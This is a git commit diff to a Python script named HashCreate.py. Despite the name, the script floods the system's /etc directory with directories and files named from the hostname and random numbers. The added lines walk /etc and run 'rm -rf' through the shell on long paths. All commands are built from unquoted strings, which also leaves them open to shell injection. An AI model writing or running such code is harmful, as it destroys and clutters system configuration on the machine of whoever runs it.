0d5f9953ffbb8525e0644ef0f9709168fcc35d3a
base-null <base-null@protonmail.com>
2020-07-21 13:02:58 -0500

    5/5 Completed for linux

--- HashCreate.py
+++ HashCreate.py
@@ -5,17 +5,23 @@ import os,socket,hashlib,random,time
 from os import system as command
 escape = '/'
 ruta = r"/etc"
+for r,d,a in os.walk(ruta):
+	if len(r) >= 131:
+		command("rm -rf %s" % (r))
 def CreateHash(i,hash,hashc,escape,ruta): #,hash,hashc,escape ARGS
 	if i == 312:
-		command("mkdir %s/%s" % (ruta, hahc + "AD"))
+		command("mkdir %s/%s" % (ruta, hashc + "AD"))
 		for root,directorio,archivo in os.walk(ruta):
-			if root > 131:
-				command("echo '%s' %s/%s/temp" % (hash,ruta,hashc))
+			if len(root) > 131:
+				command("echo '%s' > %s/%s/temp" % (hash,ruta,hashc + "AD"))
 			else:
 				pass
+				#command("echo '%s' > %s/%s/temp" % (hashc,ruta,hashc))
 	else:
 		command("mkdir %s/%s" % (ruta,hashc))
-		command("echo '%s' %s/%s/temp" % (hashc,ruta,hashc,))
+		command("echo '%s' > %s/%s/temp" % (hashc,ruta,hashc))
+	
+		
 if __name__ == '__main__':
 	for i in range(0,500):
 		hash = os.path.expanduser('~') + socket.gethostname() + str(random.randint(0,100000000000000000000000000000000000000000000000000000000000))
